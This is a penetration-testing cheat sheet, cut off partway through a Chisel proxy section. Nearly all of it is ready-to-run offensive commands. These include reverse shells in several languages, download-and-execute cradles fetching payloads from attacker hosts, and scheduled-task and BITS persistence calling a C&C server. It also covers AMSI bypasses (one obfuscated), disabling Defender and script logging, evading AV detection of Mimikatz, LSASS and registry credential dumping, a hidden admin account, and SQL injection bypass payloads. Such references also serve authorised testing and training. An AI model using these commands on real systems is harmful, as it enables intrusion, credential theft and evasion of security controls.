# Pentesting Cheat Sheet

### RPC Enumeration
```text
rpcclient [target IP]

rpcclient -U '' [target IP]

# rpcclient commands
enumdomusers
enumdomgroups
queryuser [rid]
querygroup [group rid]
```
### SMB Enumeration
```console
smbclient -L //[target IP] -N
#
smbclient -U 'username' -P 'password' [target IP]/share

smbmap -H [target IP] -u '' -p '' -R

# downlaod files with smbmap
smbmap -H [target IP] -u 'user' -p 'password' --download [full_path_to_file]

crackmapexec smb [target IP] -u '' -p '' --shares
```
### Spawning TTY's

```console
# using script
/usr/bin/script -qc /bin/bash /dev/null
```
```python=
# using python/python3
python -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```
### Get auto-tab completetion after TTY
```console=
# For Linux machines
CTRL+z
stty raw -echo
fg
Press 'Enter' multiple times

# check TERM variable on your machine
env | grep TERM

# on target machine 
export TERM=[your_TERM_variable]
# example
export TERM=xterm

# for Windows machines
# apt install rlwrap
rlwrap nc -nlvp '[port]'
```
### Extracting data from Excel files
```console
binwalk -e '[excel file]'
```
### LDAP Enumeration
```console
ldapsearch -x -h [target_ip]

ldapsearch -x -h [target_ip] -s base namingcontexts

ldapsearch -x -h [target_ip] -b 'DC=MEGABANK,DC=LOCAL' # example
```
### Webdav Enumeration
```console
davtest -url http://[target_ip]
```
### MDB Tools
```console
apt install mdb-tools

# show tables
mdb-tables [.mdb file]

for i in $(mdb-tables [.mdb file]); do mdb-export [.mdb file] $i; done
```
### Converting powershell command into base64 for execution
```console
echo -n [command] |iconv --to-code UTF-16LE |base64 -w 0

# how to run
powershell -EncodedCommand [base64_string]
powershell -enc [base_64]
```
### Read & Write Files in Oracle Database
```console
# read files
declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/inetpub/wwwroot/', 'iisstart.htm', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;

# to show output from script above:
set serveroutput ON


# write files
declare
  f utl_file.file_type;
  s varchar(1100) := 'string to write [preferably a webshell!!]';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'backdoor.aspx', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
```
### Connecting to Oracle Database with Sqlplus
```powershell
sqlplus user/password@target_ip/sid as sysdba

# if we can't access as admin
sqlplus user/password@target_ip/sid
```
### PowerUpSQL Cheat Sheet

[https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://)
### Sqlcmd
```console
sqlcmd -? # for help
sqlcmd -Q 'xp_dirtree "//10.10.14.45/test"' # use responder to capture password
```
### Zone Transfers
```console
dig axfr @10.10.10.13 cronos.htb
host -t axfr cronos.htb 10.10.10.13
```
### TcpDump
```console
# filter for ICMP packets
tcpdump -i [interface] -n icmp
```
### Port Forwarding
```console
# remote port forward example
#     - target had internal mysql port open
#     - port forward to our machine to gain access to internal port
ssh -R 3306:127.0.0.1:3306 root@10.10.14.45

# local port foward example
#     - target had internal mysql port open
#     - connecting to target and forwarding traffic from internal port 3306 to our port 3306 
ssh -L 3306:127.0.0.1:3306 user@10.10.10.10
```
### Connect to MySQL Database
```console
mysql -h [target] --port [target_port] -u [user] -p [password]
# prompt for password
mysql -h [target] --port [target_port] -u [user] -p

# example for remote port forwarding
mysql -h 127.0.0.1 --port 3333 -u MYSQL_USER -pMYSQL_PASS
```
### PHP Download and execute
```php=
<?php
exec("curl http://10.10.14.45/php-reverse-shell.php | php")
?>
```
### Exporting PATH
```console
# adding /tmp to PATH
# making /tmp the first directory Bash will check for executables
export PATH=/tmp:$PATH

# also adds /tmp to PATH
# but makes the /tmp directory the last directory Bash will check for executables
export PATH=$PATH:/tmp
```
### Bypassing Upload File Restrictions
```
PHP: phtml, .php, .php3, .php4, .php5, .inc

ASP: asp, .aspx

PERL: .pl, .pm, .cgi, .lib

JSP: .jsp, .jspx, .jsw, .jsv, .jspf

COLDFUSION: .cfm, .cfml, .cfc, .dbm
    
# example 
shell.aspx;.jpeg | shell.jsp.png
```
### Hydra Syntax
```console
# FOR HTTPS
hydra -l admin -P /usr/share/wordlists/top1m-rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64

# the difference is https-post-form for HTTPS and http-post-form for HTTP

# FOR HTTP
 hydra -l admin -P /usr/share/wordlists/top1m-rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
```
### Local File Inclusion (LFI)
```
Example's:
http://[target]/file=/var/tmp/hack.php&cmd=ls

http://[target]/file=/var/tmp/hack.php?cmd=ls

http://[target]/file=../../../../../etc/passwd
```
### Go-to PentestMonkey Reverse Shells
```console
bash -c "'bash -i >& /dev/tcp/[lhost]/[lport] 0>&1'"
# OR
bash -i >& /dev/tcp/[lhost]/[lport] 0>&1
```
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[lhost]",[lport]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```perl
perl -e 'use Socket;$i="[lhost]";$p=[lport];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
```php
php -r '$sock=fsockopen("[lhost]",[lport]);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```ruby
ruby -rsocket -e'f=TCPSocket.open("[lhost]",[lport]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### When Scanning a Webpage
- [ ] look at each pages source code for any lucrative information (passwords, usernames, service versions, programming language in use, etc)
- [ ] run directory brute force tools on root directory
    - [ ] if other directories are discovered, run directory brute force tools on these directories as well
- [ ] try checking multiple types of extensions (txt, php, aspx, etc) while directory brute forcing
- [ ] use wordlists that are specific to the server application (apache, IIS, Tomcat, etc)
### When confronted by a Login Page
- [ ] attempt sql injection
- [ ] if server application is known, try looking for default passwords for this service
- [ ] attempt to brute forcing admin account
    - [ ] if usernames are obtained, try brute forcing these accounts
- [ ] trying signing up to be an authenticated user, which comes with more privileges (some exploits require authentication)
### SQL Injection: Authentication Bypass
```
or 1=1
or 1=1--
or 1=1#
or 1=1/*

# SINGLE QUOTES
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*

# DOUBLE QUOTES
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```
###  Extracting Data From Images
```console
binwalk -e [image_file]
exiftool [image_file]
```
### When No Ports Are Reported Open by Nmap
- [ ] try using nmap's `-sU` flag for scanning UDP ports!
    * UDP scan's can take a while so also use the `-vvv` flag to retrieve information quickly
### SNMP Enumeration
```text
# basic
snmpwalk -c public -v2c [target]
snmp-check [target]

# enumerate users
snmpwalk -c public -v1 [target] 1.3.6.1.4.1.77.1.2.25

# enumerate running processes
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.25.4.2.1.2

# enumerate open TCP ports
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.6.13.1.3

# enumerate installed software
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.25.6.3.1.2

# example for SNMP v3 which requires authentication
snmpwalk -v3  -l authPriv -u snmp-poller -a SHA -A "PASSWORD1"  -x AES -X "PASSWORD1" 10.10.60.50
```
### Decrypting Group Policy Passwords: cpassword
```console
gpp-decrypt [hash]
```
### Dumping Active Directory users from linux with Impacket GetADUsers
```console
# Example
GetADUsers.py -dc-ip 10.10.10.100 -all active.htb/svc_tgs
```
### Kerberos Authentication: Enumerate Service Principal Names
```console
GetUserSPN.py [domain]/[user]:[password] -dc-ip [domain-controller-ip] -request

# Example from Active on Hackthebox
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```
### POP3 Commands
```text
USER <username>
PASS <password>
STAT
LIST
RETR
DELE
RSET
TOP
QUIT

# Login into POP3 with telnet
telnet <target> 110
```
### Privilege Escalation With Python
```python
python -c 'import os; os.system("nc <IP> <PORT>");'
```
### Redis SSH Key Upload
Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa

Write the public key to a file : (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

Import the file into redis : cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit

Save the public key to the authorized_keys file on redis server:
```
root@Urahara:~# redis-cli -h 10.85.0.52
# on the redis server
config set dir /home/test/.ssh/
config set dbfilename "authorized_keys"
save
```
Then, ssh onto the machine: ssh -i id_rsa root@10.10.10.60


### Password/Passphrase Cracking
```console
hashcat -m <hash mode> <hashfile> <wordlist_file>
# example hashes
hashcat --example

# convert encrypted ssh key to hash crackable by john
ssh2john <private key> > output.hash
john <hash_file> --wordlist=<wordlist_file>

# list supported formats
john --list=formats
```
### When Password Has Been Obtained
* attempt to use the password for every possible account
* attempt to use the password to login to different services (ssh, http, etc)
* if the password has a year, and it does not work, try changing the year to the current year

### Pkexec
```console
psexec.py <username>:'<password>'@<target>
# Example
psexec.py pentest:'P3nT3st!'@netmon.htb
```
### SQLMap
```a
sqlmap -r [file_with_HTTP_request_for_login_page] --level 5 --risk
```
### Generating RSA Keys With OpenSSL
```
#  generating private key
openssl genrsa -out <key_file_name>.pem 2048

# extracting public key from private key
openssl rsa -in <private_key_file> -out <public_key_file>.pem -outform PEM -pubout

# encrypting file with public key
openssl rsautl -encrypt -inkey <public_key> -pubin -in <file_to_encrypt> -out <output_file>

# decrypting file with private key
openssl rsautl -decrypt -inkey <private_key> -in <encrypted_file> -out <decrypted_file>
```
### Cracking Encrypted Microsoft Office Documents with John
```
python office2john.py [ms_doc_file] > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### Capturing packets during pentest for proof of actions
```
# filter for packets coming from your ethernet address
# files will be named according to the date/time.
# here we also specified the maximum size of the pcap file 
dumpcap -f "ether host 00:0c:29:54:f1:d0" -w pentest -b filesize:10000
```
### Checking the SSL certificate of a website
```
openssl s_client -connect [IP]:443
```
### Generating an Openssl RSA key and generating Certificate Signing Request from key
```
openssl genrsa -aes256 -out test.key 2048
openssl req -key test.key -new -out domain.csr
```
### Signing a certificate signing request using a CA's public key and private key
```
openssl genrsa -aes256 -out binexis.key
openssl x509 -req -in binexis.csr -CA ca.cert -CAkey ca.key -CAcreateserial -out binexis.pem -days 1024 -sha256
```
### Packaging public key into pkcs format for importing to browser
```
openssl pkcs12 -export -out binexis.pfx -inkey binexis.key -in binexis.pem -certfile ca.cert
```
### Sending SMTP Emails with Swaks (Swiss Army Knife for SMTP)
```console
swaks \
  --from [sender_email] \
  --to [recipient_email] \
  --header 'Subject message' \
  --body 'Body message' \
  --server [STMP Server IP]
```
### Edting `/etc/samba/smb.conf` for SMB share creation
```
[share_name]
  comment = Share description
  path = /home/user/Documents/smb/ # Path to the SMB share on your machine
  browseable = yes
  read only = no
  guest ok = yes
```
- Change permissions to share directory: `chmod 777 /home/user/Documents/smb/`
- Restart the SMB daemon: `sudo service smbd restart`
### Decrypt PowerShell `SecureString` Network Credentials
```powershell
$s = Import-CliXml -Path root.xml
$s.GetNetworkCredential().Password # Extracting Password XML field
```
### Create Secure String: PowerShell for PowerShell Remoting
```powershell
$Pass = ConvertTo-SecureString -AsPlainText -Force 'this is my secure p@ssword!@#'
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\admin', $Pass)
Enter-PSSession -ComputerName 10.10.10.10 -Credential $Cred
```
### Socat
```
# Listen
socat tcp-listen:<listen-port> stdout
# example: socat tcp-listen:9999,fork,reuseaddr stdout

# Connect
socat TCP:<remote-ip>:<remote-port> EXEC:/bin/bash
# example: socat tcp4-connect:0.tcp.ngrok.io:92349 exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Port Forward
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<forward-ip>:<forward-port>

# Host File
socat -u FILE:<file_name> TCP-LISTEN:<listen-port>,reuseaddr

# Get File
socat -u TCP:<listen-ip>:<listen-port> OPEN:<file-to-create>,create,trunc
```
### AWS Pentesting
```console
IMDSv1
------
curl http://169.254.169.254/latest/user-data

IMDSv2
------
# Generate token and set expiration to 6 hours
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/

# get instance types
aws ec2 describe-instance-types | jq -r '.InstanceTypes | .[].InstanceType'

# get ami images
aws ec2 describe-images --owners self amazon | jq '.Images | .[] | select(.Description != null) | "\(.ImageId) \(.Description)"'

# get ec2 instances public ip addresses
aws ec2 describe-instances --profile [profile] | jq '.Reservations[] | .Instances[].PublicIpAddress'

# get ec2 instances security groups
aws ec2 describe-instances --profile [profile] | jq '.Reservations[].Instances[] | "\(.InstanceId) \(.PublicIpAddress) \(.NetworkInterfaces[].Groups[].GroupId)"'

# get ec2 instance ids and iam instance profiles arn's
aws ec2 describe-instances --profile [profile] --query 'Reservations[].Instances[]' | jq '.[] | "\(.InstanceId) :: \(.IamInstanceProfile.Arn)"' | grep -v null

# launching a new ec2 instance with the instance profile of another ec2 instance
ARN="[ARN-OF-TARGET-EC2-INSTANCE-PROFILE]"
SubnetId="subnet-0ca23ae417686dd98"
GroupId="sg-00eebb34bb8fe072e"
aws ec2 run-instances --image-id 'ami-00a208c7cdba991ea' --iam-instance-profile Arn=$ARN --key-name [key_name] --subnet-id $SubnetId --security-group-ids $GroupId --output table --profile [profile]

# getting a reverse shell with user data if `run-instances` permissions are set but not `create-key-pair`
aws ec2 run-instances --image-id 'ami-00a208c7cdba991ea' --iam-instance-profile Arn=$ARN --user-data file://[userdata_file] --subnet-id $SubnetId --security-group-ids $GroupId --output table --profile [profile]
## example user-data file
curl -o /tmp/socat https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
/tmp/socat tcp4:<remote-ip>:<remote-port> exec:/bin/bash


```
### GCP Pentesting
```console
# list all metadata directories and files
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# retrieve instance token - the HTTP header ``Metadata-Flavor: Google`` must be specified!
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' | jq

# cat config files
cat ~/.config/gcloud/*

# get projects iam policies
PROJECT=$(gcloud config get-value project) && gcloud projects get-iam-policy $PROJECT

curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" -H "Metadata-Flavor: Google"

# get access token info
TOKEN="<TOKEN>"
curl -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$TOKEN" https://www.googleapis.com/oauth2/v1/tokeninfo

gsutil cp gs://e2etest-secrets/test-user-password ./test
```
### Azure Pentesting
```console
# login 
az login

# execute powershell in VM
az vm run-command invoke --command-id RunPowerShellScript --name <vm-name> -g <resource-group> --scripts @<ps-script-name> --parameters "arg1=foo1" "arg2=foo2"

# retrieve metadata
curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01" | jq
```
### Kubernetes Pentesting
```console
kubectl cluster-info
```
### Ngrok Cloud Tunneling
```console
# Go here to download Ngrok binary: https://dashboard.ngrok.com/get-started/setup

# provide API token to use
ngrok auth '<TOKEN>'

# ------ HTTP ------
# create HTTP tunnel
ngrok http <port-to-tunnel-to> # yes it's that simple!!!

# create a password protected HTTP tunnel
ngrok http -auth="username:password" 8080

# forward tunnel to a web server on a different machine
ngrok http 169.254.169.254:8080

# ------ TCP ------
# create TCP tunnel
ngrok tcp <port-to-tunnel-to>

# expose SSH server listening on local port 2222
ngrok tcp 2222
```
### Iptables NAT Forwarding
```console
# temporary routing
sudo sysctl net.ipv4.ip_forward=1

# permanent routing
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# creating a redirection rule with iptables
# rule = redirect traffic to inbound port to destination ip:port
iptables -I INPUT -p tcp -m tcp --dport 1234 -j ACCEPT
iptables -t nat -A PREROUTING -i <interface> -p tcp -dport <inbound-port> -j DNAT --to-destionation <dst-ip:dst-port>
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD -j ACCEPT
```
### Netsh portproxy
```poweroshell
# create a redirect rule
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=1234 connectaddress=1.2.3.4 connectport=8080 protocol=tcp

# delete port forward rule
netsh interface portproxy delete v4tov4 listenaddr=0.0.0.0 listenport=1234

# show all portproxy rules
netsh interface portproxy show all
```
### AWS Key Management Service (KMS) Encrypt/Decrypt
```console
# encrypt data
aws kms encrypt --key-id <KeyID> --plaintext "<plaintext>" | jq -r '.CiphertextBlob'

# decrypt data
aws kms decrypt --ciphertext-blob fileb://ciphertext.bin # the raw binary, not base64 encoded

# encrypt file
aws kms encrypt --key-id <KeyID> --plaintext fileb://<plain-text-file> --query CiphertextBlob --output text | base64 -d | base64 -w 76 > ciphertext-data.txt

# decrypt file
aws kms decrypt --ciphertext-blob fileb://ciphertext-data.txt --output text --query Plaintext | base64 -d > plaintext.txt
```
### Simple CLI Servers
```console
HTTP
----
# python2
python -m SimpleHTTPServer <port> # use sudo if port is under 1024

# python3
python3 -m http.server <port> # use sudo if port is under 1024

# php
php -S <ip>:<port>, ex: php -S 0.0.0.0:8080

# ruby
ruby -run -e httpd . -p <port>

SMTP
----
sudo python3 -m smtpd -n -c DebuggingServer <ip>:<port>
```
### Dumping Database with mysqldump
```
mysqldump --databases drupal --user=drupaluser --password='StRoNgPaSsWoRd' --host=127.0.0.1
```

### Graphql Enum
```
# get all graphql defined types
{
	"query": "query {__schema{types{name,fields{name}}}}"
}


# extract all types, fields, and arguments
{
	"query": "query {__schema{types{name,fields{name, args{name,type{name, kind, ofType{name, kind}}}}}}}" 
}

# introspection query
{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```
### Socat and Openssl
```console
# generate cert
openssl req -x509 -newkey rsa:4096 -keyout out.key -out out.crt -days 365 -nodes -subj '/C=US/ST=Phili/O=Evilcrop'
cat out.* > cert.pem

# listen over ssl using cert generated using commands above
socat -d -d OPENSSL-LISTEN:8443,cert=cert.pem,verify=0,fork STDOUT

# connect to listener
socat OPENSSL:localhost:8443,verify=0 EXEC:/bin/bash
```
### Retrieving Certificate From Private Key
```console
openssl rsa -in private.key -pubout -outform PEM -out public.key
```
### Create/Add User To Local Admininistrators Group and Hide User From Windows Logon Screen
```
net.exe user DefaultUser REDACTED /ADD 

net.exe localgroup Administrators DefaultUser /ADD 

reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v DefaultUser /t REG_DWORD /d 0 /f
```
### PowerShell Net.Client Patch Work Around
```powershell
// Long Version
$webreq = [System.Net.WebRequest]::Create("http://server.com/reverse.ps1")
$resp = $webreq.GetResponse()
$respstream = $resp.GetResponseStream()
$reader = [System.IO.StreamReader]::new($respstream)
$content = $reader.ReadToEnd()
IEX($content)

// Short Version
IEX([Net.Webclient]::new().DownloadString("http://server.com/reverse.ps1"))
```
### Disable PowerShell Script Logging
```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```
### EyeWitness
```console
# from url list
eyewitness -f urls.txt --threads 10 --web
# from Nmap xml output file
eyewitness -x nmap.xml --threads 10 --web
```
### AMSI Bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated ASMI Bypass (same as line above)
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Alternative AMSI bypass technique not detected by PowerShell autologging
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
### Reflectively Loading C# in PowerShell (Requires AMSI Bypass)
```powershell
# Running PE file that doesn't expect any arguments
# -----------------------------------------------------
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# Running PE file that does expect arguments (Rebeus example)
# -----------------------------------------------------
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Executing a specific method from a loaded DLL 
# -----------------------------------------------------
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
### Active Directory Enumeration with PowerView
```powershell
Get-DomainUser | Select -ExpandProperty cn
Get-DomainComputer
Get-ForestDomain
Get-DomainGroup "Domain Admins"
Get-DomainGroupMember "Domain Admins" | Select -ExpandedProperty membername
Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC
Get-DomainOU -FullData
# Noisy command
Find-LocalAdminAccess
Get-DomainUser -SPN | select name, serviceprincipalname
# Kerberoasting
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.evilcorps.com"
```
### Creating a Scheduled Task
```
# Create a task
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.evilcorp.com /sc weekly /tr "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://37.37.37.37/rev.ps1''')'"
# Run the task
schtasks /RUN /TN "shell" /s dc.targetdomain.com
```
### Manipulating Windows Defender
```
# Turn off Realtime Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Turn off scans for downloaded files and attachments
Set-MpPreference -DisableIOAVProtection $true

# Exclude a directory from scans
Add-MpPreference -ExclusionPath "C:/path/to/dir"

# Leave Defender running but remove all detection signatures
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
### wpscan Aggressive Scan on All WordPress Plugins
```console
wpscan -u https://someurl.com -e ap --plugins-detection aggressive
```
### PowerShellMafia Invoke-Mimikatz In-Memory Execution
```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
```
### Bypass AV Detection of Invoke-Mimikatz
```console
sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
```
### Creating an SMB Sever Using Impacket
```
sudo smbserver.py -smb2support <share_name> $(pwd)
```
### Ldapsearch without Domain
```
ldapsearch -x -h [IP] -b '' -s base '(objectclass=*)'
```
### UAC Bypass: Event Viewer Registery Key
```
# Our malicious payload will be triggered every time a .msc file is opened which
# is why event viewer (eventvwr.exe) is commonly executed because it executes Microsoft's Management Console (mmc.exe)
# which in turn triggers our payload.
reg add HKCU\Software\Classes\mscfile\shell\open\command /d [malicious_exe_path] /f
```
### Privilege Escalation: Local Admin to SYSTEM with PsExec
```
C:\SysinternalsSuite\psexec64 -s -i cmd.exe
```
### Background Intelligent Transfer Service (BITS) Persistence
```
# Create new transfer job named "Windows Update"
bitsadmin /Create "Windows Update"

# Add a file to our job
bitsadmin /AddFile "Windows Update" http://<yourC&C>.com/kb%RANDOM%.exe %TEMP%\kb7468656d.exe

# Customize the notification event trigger
bitsadmin /SetNotifyFlags "Windows Update" 1

# Specify command to execute on notification event
bitsadmin.exe /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B %TEMP%\kb7468656d.exe"

# Set retry delay on transient error in seconds
bitsadmin /SetMinRetryDelay "Windows Update" 120

# Assign custom HTTP Request header
bitsadmin /SetCustomHeaders "Windows Update" "Caller:%USERNAME%@%COMPUTERNAME%"

# Activate job for transfer
bitsadmin /Resume "Windows Update" 
```
### Persistence with Skeleton Key

> Must be ran on Domain Controller and requires domain admin level privileges

```
privilege::debug
misc::skeleton // authenticate as any domain user using the password "mimikatz"
```
### WMIC Enumeration
```
wmic useraccount get name						# get users
wmic group get name							# get groups
wmic startup get caption,command,location,user /format:list		# get startup program information
wmic process get name,processid,parentprocessid,executablepath 		# get process information
wmic qfe get hotfixid,caption,installedon 				# check for missing patches
wmic share list								# enumerate local SMB shares
wmic service get name,processid,startmode,state 			# get service information
wmic environment get name,variablevalue /format:csv			# get environment variables
```
### PowerShell CIM/WMIC Enumeration
```powershell
get-ciminstance -classname win32_useraccount | select name
get-ciminstance -classname win32_environment | select name,variablevalue
```
### Enabling SMB and Creating a New Share with PowerShell
```
Set-SmbServerConfiguration -EnableSMB2Protocol $true
New-SmbShare -Name 'gs_share' -Path 'C:\Temp\' -FullAccess 'bin3xish477' -Description 'Temp file share'
```
### Check for Remote Access to Target Machine
```powershell
gci \\[target\c$
# OR
Get-WmiObject -Class win32_operatingsystem -Computername [target]
# Or with PowerView
Find-LocalAdminAccess
```
### Enabling PowerShell Remoting
```powershell
Enable-PSRemoting -Force
# Allow all hosts to PSremote in a workdrop, non-domain environment
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Restart-Service WinRM
# Don't forget to add user to remote management user group!
Add-LocalGroupMember -Group 'Remote Management Users' -Member 'bin3xish477'
```
### Cathering Registry Hive for Dumping Credentials
```powershell
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
# transfer the files over to the attacking machine and then dump the hashes with impacket
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Dumping LSASS with ProcDump
```powershell
procdump64.exe -accepteula -ma LSASS c:\temp\lsass.dmp
```
### SCF Example File for Capturing NTLM Hashes with Responder
```
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\evil.ico
[Taskbar]
Command=ToggleDesktop
```
### Test if Port is Open with PowerShell
```powershell
Test-NetConnection -ComputerName 10.10.10.10 -Port 8080
```
### Minimizing the Size of Go Binary for Transer (Chisel Example)
```console
git clone https://github.com/jpillora/chisel.git
cd chisel
# the following command build chisel for windows/amd64
# and also strips symbol information and omits the DWARF
# symbol table, making the binary smaller
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" main.go
```
### Chisel SOCKS Proxy
```console
# SOCKS server running on victim machine
@victim $ chisel-windows server --socks5 -p 9010
